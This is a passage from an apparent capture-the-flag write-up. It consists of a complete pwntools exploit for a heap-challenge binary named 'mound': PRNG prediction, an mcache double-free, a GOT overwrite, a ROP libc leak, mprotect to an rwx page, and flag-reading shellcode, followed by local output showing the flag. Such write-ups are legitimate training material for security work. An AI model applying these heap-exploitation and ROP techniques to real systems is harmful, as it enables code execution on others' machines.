</span></span><span class=line><span class=cl><span class=n>mound_data</span> <span class=o>=</span> <span class=n>namedtuple</span><span class=p>(</span><span class=s1>&#39;beef&#39;</span><span class=p>,</span> <span class=s1>&#39;base mcache dents shellcode&#39;</span><span class=p>)(</span><span class=n>BEEF</span><span class=p>,</span> <span class=n>BEEF</span><span class=o>+</span><span class=mh>0x10</span><span class=p>,</span> <span class=n>BEEF</span><span class=o>+</span><span class=mh>0x10000</span><span class=p>,</span> <span class=n>BEEF</span><span class=o>+</span><span class=mh>0x100</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>midxs</span> <span class=o>=</span> <span class=n>namedtuple</span><span class=p>(</span><span class=s1>&#39;midb&#39;</span><span class=p>,</span> <span class=s1>&#39;prev_size_editor fakeid_provider strdup mcache_dup got_overwriter&#39;</span><span class=p>)(</span><span class=mi>5</span><span class=p>,</span> <span class=mi>6</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>1</span><span class=p>,</span> <span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=s1>&#39;mound&#39;</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>libc</span> <span class=o>=</span> <span class=s1>&#39;libc.so.6&#39;</span>
</span></span><span class=line><span class=cl><span class=n>libc</span> <span class=o>=</span> <span class=n>CDLL</span><span class=p>(</span><span class=s1>&#39;libc.so.6&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>t</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>time</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span> <span class=o>=</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>process</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>libc</span><span class=o>.</span><span class=n>srand</span><span class=p>(</span><span class=n>t</span><span class=o>^</span><span class=n>r</span><span class=o>.</span><span class=n>pid</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># I/O methods</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>choose</span><span class=p>(</span><span class=n>opt</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span> <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;&gt; &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>opt</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>strdup</span><span class=p>(</span><span class=n>s</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>,</span> <span class=n>i</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>choose</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;Pile: &#39;</span><span class=p>,</span> <span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>add</span><span class=p>(</span><span class=n>midx</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>idx</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>s</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>choose</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>sz</span> <span class=o>=</span> <span class=n>midx2rsize</span><span class=p>(</span><span class=n>midx</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=n>sz</span> <span class=o>&lt;</span> <span class=mh>0x1000</span>
</span></span><span class=line><span class=cl>    <span class=k>assert</span> <span class=nb>len</span><span class=p>(</span><span class=n>s</span><span class=p>)</span> <span class=o>&lt;=</span> <span class=n>sz</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;pile: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>sz</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;Pile: &#39;</span><span class=p>,</span> <span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>edit</span><span class=p>(</span><span class=n>idx</span><span class=p>:</span> <span class=nb>int</span><span class=p>,</span> <span class=n>s</span><span class=p>:</span> <span class=nb>bytes</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>choose</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=s1>&#39;pile: &#39;</span><span class=p>,</span> <span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>free</span><span class=p>(</span><span class=n>idx</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>choose</span><span class=p>(</span><span class=mi>4</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;index: &#39;</span><span class=p>,</span> <span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>csize2midx</span><span class=p>(</span><span class=n>x</span><span class=p>:</span><span class=nb>int</span><span class=p>):</span> <span class=k>return</span> <span class=p>(</span><span class=n>x</span><span class=o>&gt;&gt;</span><span class=mi>4</span><span class=p>)</span><span class=o>-</span><span class=mi>2</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>midx2csize</span><span class=p>(</span><span class=n>i</span><span class=p>:</span><span class=nb>int</span><span class=p>):</span> <span class=k>return</span> <span class=p>(</span><span class=n>i</span><span class=o>+</span><span class=mi>2</span><span class=p>)</span><span class=o>&lt;&lt;</span><span class=mi>4</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>size2request</span><span class=p>(</span><span class=n>x</span><span class=p>:</span><span class=nb>int</span><span class=p>):</span> <span class=k>return</span> <span class=n>x</span><span class=o>-</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>request2size</span><span class=p>(</span><span class=n>x</span><span class=p>:</span><span class=nb>int</span><span class=p>):</span> <span class=k>return</span> <span class=n>x</span><span class=o>+</span><span class=mh>0x10</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>midx2rsize</span><span class=p>(</span><span class=n>i</span><span class=p>:</span><span class=nb>int</span><span class=p>):</span> <span class=k>return</span> <span class=n>size2request</span><span class=p>(</span><span class=n>midx2csize</span><span class=p>(</span><span class=n>i</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>r64bit</span><span class=p>():</span> <span class=k>return</span> <span class=n>libc</span><span class=o>.</span><span class=n>rand</span><span class=p>()</span><span class=o>+</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>rand</span><span class=p>()</span><span class=o>&lt;&lt;</span><span class=mi>32</span><span class=p>)</span> <span class=c1># emulate rand64bit</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>r64</span><span class=p>():</span> <span class=k>return</span> <span class=n>randint</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=p>(</span><span class=mi>1</span><span class=o>&lt;&lt;</span><span class=mi>64</span><span class=p>)</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span> <span class=c1># a separate, unrelated function to produce random numbers</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>O_DIRECTORY</span><span class=p>,</span> <span class=n>FLAG_LEN</span> <span class=o>=</span> <span class=mh>0x10000</span><span class=p>,</span> <span class=mi>100</span> <span class=c1># use reasonably long values here</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=s1>&#39;&#39;</span> <span class=c1># step 1: getting a directory listing</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>pushstr</span><span class=p>(</span><span class=s1>&#39;/pwn&#39;</span><span class=p>)</span> <span class=c1># put &#34;/pwn&#34; on the stack</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>openat</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=s1>&#39;rsp&#39;</span><span class=p>,</span> <span class=n>O_DIRECTORY</span><span class=p>)</span> <span class=c1># use openat in lieu of open. rsp because of pushstr</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=s1>&#39;mov QWORD PTR [</span><span class=si>{}</span><span class=s1>], rax</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>mound_data</span><span class=o>.</span><span class=n>base</span><span class=p>)</span> <span class=c1># Store the resultant fd _somewhere_ accessible (mound_data.base)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>getdents64</span><span class=p>(</span><span class=s1>&#39;rax&#39;</span><span class=p>,</span> <span class=n>mound_data</span><span class=o>.</span><span class=n>dents</span><span class=p>,</span> <span class=mh>0x10000</span><span class=p>)</span> <span class=c1># use getdents to list directory</span>
</span></span><span class=line><span class=cl><span class=c1># step 2: loop through the dents data to find the flag filename</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span><span class=n>shellcraft</span><span class=o>.</span><span class=n>mov</span><span class=p>(</span><span class=s1>&#39;rax&#39;</span><span class=p>,</span> <span class=n>mound_data</span><span class=o>.</span><span class=n>dents</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=s1>&#39;loop:</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=s1>&#39;inc rax</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=s1>&#39;cmp DWORD PTR [rax], </span><span class=si>{}</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=nb>hex</span><span class=p>(</span><span class=n>u32</span><span class=p>(</span><span class=s1>&#39;.txt&#39;</span><span class=p>)))</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=s1>&#39;jne loop</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># step 3: open the flag file, read to _somewhere_ (mound_arena.base), and write to stdout</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=s1>&#39;lea rbx, [rax-0x20]</span><span class=se>\n</span><span class=s1>&#39;</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=s1>&#39;mov rax, QWORD PTR [</span><span class=si>{}</span><span class=s1>]</span><span class=se>\n</span><span class=s1>&#39;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>mound_data</span><span class=o>.</span><span class=n>base</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>openat</span><span class=p>(</span><span class=s1>&#39;rax&#39;</span><span class=p>,</span> <span class=s1>&#39;rbx&#39;</span><span class=p>,</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>read</span><span class=p>(</span><span class=s1>&#39;rax&#39;</span><span class=p>,</span> <span class=n>mound_arena</span><span class=o>.</span><span class=n>base</span><span class=p>,</span> <span class=n>FLAG_LEN</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span><span class=o>+=</span> <span class=n>shellcraft</span><span class=o>.</span><span class=n>write</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>mound_arena</span><span class=o>.</span><span class=n>base</span><span class=p>,</span> <span class=n>FLAG_LEN</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sc</span> <span class=o>=</span> <span class=n>asm</span><span class=p>(</span><span class=n>sc</span><span class=p>)</span> <span class=c1># don&#39;t call asm() twice</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=mi>1</span><span class=o>+</span><span class=n>csize2midx</span><span class=p>(</span><span class=n>request2size</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>sc</span><span class=p>))),</span> <span class=mi>8</span><span class=p>,</span> <span class=n>sc</span><span class=p>)</span> <span class=c1># dump shellcode somewhere in mound_data for later use</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># The Obvious Solution: mcache dup --&gt; mound_arena.top overwrite --&gt; GOT table edit to win()</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rm_id</span><span class=p>(</span><span class=nb>id</span><span class=p>:</span> <span class=nb>int</span><span class=p>):</span> <span class=c1># remove an arbitrary 56-bit id from mound_arena.ids[]</span>
</span></span><span class=line><span class=cl>    <span class=n>strdup</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x17</span><span class=p>,</span> <span class=mi>5</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>strdup</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x17</span><span class=p>,</span> <span class=mi>6</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>edit</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>prev_size_editor</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=n>r64</span><span class=p>())[:</span><span class=mi>7</span><span class=p>]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mh>0x17</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>free</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>fakeid_provider</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>edit</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>prev_size_editor</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=nb>id</span><span class=p>)[:</span><span class=mi>7</span><span class=p>]</span><span class=o>.</span><span class=n>rjust</span><span class=p>(</span><span class=mh>0x17</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>strdup</span><span class=p>,</span> <span class=mi>7</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=o>*</span><span class=mh>0x10</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>_</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>3</span><span class=p>):</span> <span class=n>r64bit</span><span class=p>()</span> <span class=c1># There have been 3 rand64bit() calls so far; account for them.</span>
</span></span><span class=line><span class=cl><span class=k>while</span> <span class=mi>1</span><span class=p>:</span> <span class=c1># try adding until there&#39;s an ID with a null MSB</span>
</span></span><span class=line><span class=cl>    <span class=n>add</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>mcache_dup</span><span class=p>,</span> <span class=mh>0xf</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;hi&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=p>((</span><span class=n>chunk_id</span> <span class=o>:=</span> <span class=n>r64bit</span><span class=p>())</span> <span class=o>&gt;&gt;</span> <span class=mi>56</span><span class=p>):</span> <span class=k>break</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mh>0xf</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rm_id</span><span class=p>(</span><span class=n>chunk_id</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>free</span><span class=p>(</span><span class=mh>0xf</span><span class=p>)</span> <span class=c1># mcache dup</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>mcache_dup</span><span class=p>,</span> <span class=mh>0xe</span><span class=p>,</span> <span class=n>fit</span><span class=p>(</span><span class=n>mound_data</span><span class=o>.</span><span class=n>mcache</span><span class=p>,</span> <span class=n>mound_arena</span><span class=o>.</span><span class=n>mcache</span><span class=o>-</span><span class=mh>0x10</span><span class=p>))</span> <span class=c1># overwrite -&gt;next</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>mcache_dup</span><span class=p>,</span> <span class=mh>0xd</span><span class=p>,</span> <span class=s1>&#39;hi&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>mcache_dup</span><span class=p>,</span> <span class=mh>0xc</span><span class=p>,</span> <span class=n>fit</span><span class=p>(</span><span class=n>mound_data</span><span class=o>.</span><span class=n>mcache</span><span class=p>,</span> <span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;setvbuf&#39;</span><span class=p>]))</span> <span class=c1># overwrite .top</span>
</span></span><span class=line><span class=cl><span class=n>add</span><span class=p>(</span><span class=n>midxs</span><span class=o>.</span><span class=n>got_overwriter</span><span class=p>,</span> <span class=mh>0xb</span><span class=p>,</span> <span class=n>pack</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>sym</span><span class=o>.</span><span class=n>win</span><span class=p>))</span> <span class=c1># overwrite got[&#39;scanf&#39;]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># win() will execute. Leak libc in the first cycle.</span>
</span></span><span class=line><span class=cl><span class=n>R</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x48</span><span class=o>*</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=o>.</span><span class=n>puts</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>binary</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>])</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=o>.</span><span class=n>win</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;;)</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>R</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;read&#39;</span><span class=p>]</span> <span class=o>=</span> <span class=n>unpack</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()[:</span><span class=mi>6</span><span class=p>],</span> <span class=s1>&#39;all&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># Using libc, change 0xbeef* to an rwx page, and jump to the shellcode that was allocated there earlier on.</span>
</span></span><span class=line><span class=cl><span class=n>R</span> <span class=o>=</span> <span class=n>ROP</span><span class=p>(</span><span class=n>context</span><span class=o>.</span><span class=n>libc</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=o>.</span><span class=n>raw</span><span class=p>(</span><span class=mh>0x48</span><span class=o>*</span><span class=sa>b</span><span class=s1>&#39;a&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=o>.</span><span class=n>mprotect</span><span class=p>(</span><span class=n>mound_data</span><span class=o>.</span><span class=n>base</span><span class=p>,</span> <span class=mh>0x400000</span><span class=p>,</span> <span class=mi>7</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>R</span><span class=o>.</span><span class=n>call</span><span class=p>(</span><span class=n>mound_data</span><span class=o>.</span><span class=n>shellcode</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;;)</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>,</span> <span class=n>R</span><span class=o>.</span><span class=n>chain</span><span class=p>())</span>
</span></span><span class=line><span class=cl><span class=c1># get flag</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>r</span><span class=o>.</span><span class=n>recvall</span><span class=p>())</span>
</span></span></code></pre></td></tr></table></div></div><p>Locally, this works!</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=p>[</span><span class=n>libc</span><span class=p>]</span> <span class=n>Running</span> <span class=err>&#39;</span><span class=o>/</span><span class=n>mound</span><span class=err>&#39;</span> <span class=n>with</span> <span class=n>libs</span> <span class=n>in</span> <span class=err>&#39;</span><span class=o>/</span><span class=n>libc</span><span class=o>-</span><span class=n>database</span><span class=o>/</span><span class=n>libs</span><span class=o>/</span><span class=n>libc6_2</span><span class=mf>.31</span><span class=o>-</span><span class=mi>0u</span><span class=n>buntu9</span><span class=mf>.1</span><span class=n>_amd64</span><span class=err>&#39;</span><span class=o>!</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Starting</span> <span class=n>local</span> <span class=n>process</span> <span class=err>&#39;</span><span class=o>/</span><span class=n>libc</span><span class=o>-</span><span class=n>database</span><span class=o>/</span><span class=n>libs</span><span class=o>/</span><span class=n>libc6_2</span><span class=mf>.31</span><span class=o>-</span><span class=mi>0u</span><span class=n>buntu9</span><span class=mf>.1</span><span class=n>_amd64</span><span class=o>/</span><span class=n>ld</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>x86</span><span class=o>-</span><span class=mf>64.</span><span class=n>so</span><span class=mf>.2</span><span class=err>&#39;</span><span class=o>:</span> <span class=n>pid</span> <span class=mi>10422</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Loaded</span> <span class=mi>15</span> <span class=n>cached</span> <span class=n>gadgets</span> <span class=k>for</span> <span class=err>&#39;</span><span class=n>mound</span><span class=err>&#39;</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Loaded</span> <span class=mi>201</span> <span class=n>cached</span> <span class=n>gadgets</span> <span class=k>for</span> <span class=err>&#39;</span><span class=o>/</span><span class=n>libc</span><span class=o>-</span><span class=n>database</span><span class=o>/</span><span class=n>db</span><span class=o>/</span><span class=n>libc6_2</span><span class=mf>.31</span><span class=o>-</span><span class=mi>0u</span><span class=n>buntu9</span><span class=mf>.1</span><span class=n>_amd64</span><span class=p>.</span><span class=n>so</span><span class=err>&#39;</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>+</span><span class=p>]</span> <span class=n>Receiving</span> <span class=n>all</span> <span class=nl>data</span><span class=p>:</span> <span class=n>Done</span> <span class=p>(</span><span class=mi>100</span><span class=n>B</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=n>Stopped</span> <span class=n>process</span> <span class=err>&#39;</span><span class=o>/</span><span class=n>libc</span><span class=o>-</span><span class=n>database</span><span class=o>/</span><span class=n>libs</span><span class=o>/</span><span class=n>libc6_2</span><span class=mf>.31</span><span class=o>-</span><span class=mi>0u</span><span class=n>buntu9</span><span class=mf>.1</span><span class=n>_amd64</span><span class=o>/</span><span class=n>ld</span><span class=o>-</span><span class=n>linux</span><span class=o>-</span><span class=n>x86</span><span class=o>-</span><span class=mf>64.</span><span class=n>so</span><span class=mf>.2</span><span class=err>&#39;</span> <span class=p>(</span><span class=n>pid</span> <span class=mi>10422</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>b</span><span class=err>&#39;</span><span class=n>test</span><span class=p>{</span><span class=n>flag</span><span class=p>}</span><span class=err>\</span><span class=n>n</span><span class=p>.</span><span class=o>^</span><span class=n>J</span><span class=err>\</span><span class=n>xb5o</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>xc72</span><span class=err>\</span><span class=n>x89f</span><span class=err>\</span><span class=n>xe9O</span><span class=err>\</span><span class=n>xc1</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>\</span><span class=n>x00</span><span class=err>&#39;</span>
